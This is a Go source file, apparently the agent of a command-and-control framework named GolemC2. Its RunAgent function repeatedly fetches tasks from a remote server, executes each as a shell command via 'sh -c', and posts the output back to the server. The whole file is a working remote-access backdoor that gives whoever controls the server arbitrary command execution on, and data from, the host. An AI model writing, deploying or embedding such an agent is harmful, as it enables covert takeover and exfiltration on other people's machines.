package cmd

import (
    "bytes"
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "os/exec"
    "time"

    "github.com/DUDLEYDANIEL/GolemC2/internal"
)

func RunAgent(server string) {
    for {
        resp, err := http.Get(server + "/tasks")
        if err != nil {
            fmt.Println("[-] Failed to fetch tasks:", err)
            time.Sleep(5 * time.Second)
            continue
        }

        body, err := io.ReadAll(resp.Body)
        resp.Body.Close()
        if err != nil {
            fmt.Println("[-] Failed to read response body:", err)
            time.Sleep(5 * time.Second)
            continue
        }

        var tasks []internal.Task
        if err := json.Unmarshal(body, &tasks); err != nil {
            fmt.Println("[-] Failed to unmarshal tasks:", err)
            time.Sleep(5 * time.Second)
            continue
        }

        for _, task := range tasks {
            fmt.Println("[*] Executing:", task.Command)
            out, err := exec.Command("sh", "-c", task.Command).CombinedOutput()
            if err != nil {
                out = append(out, []byte("\n[!] "+err.Error())...)
            }

            result := internal.Result{
                TaskID: task.ID,
                Output: string(out),
            }

            buf, err := json.Marshal(result)
            if err != nil {
                fmt.Println("[-] Failed to marshal result:", err)
                continue
            }

            if _, err := http.Post(server+"/results", "application/json", bytes.NewBuffer(buf)); err != nil {
                fmt.Println("[-] Failed to post result:", err)
            }
        }

        time.Sleep(10 * time.Second)
    }
}

